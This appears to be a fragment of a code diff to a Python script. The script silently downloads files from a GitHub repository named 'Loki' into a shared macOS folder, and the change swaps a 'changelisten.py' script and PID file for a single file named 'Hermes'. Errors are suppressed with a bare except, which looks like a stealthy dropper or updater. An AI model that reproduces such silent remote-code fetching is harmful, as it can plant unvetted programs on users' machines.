@@ -6,8 +6,7 @@ try:
   import time
   time.sleep (0.5)
   import urllib
-  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/changelisten.py", "/Users/Shared/Hermes/changelisten.py")
-  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/pid.txt", "/Users/Shared/Hermes/pid.txt")
-  time.sleep (1)
+  urllib.urlretrieve ("https://github.com/3-TA/Loki/raw/main/Hermes", "/Users/Shared/Hermes")
+  time.sleep (5)
 except:
   pass
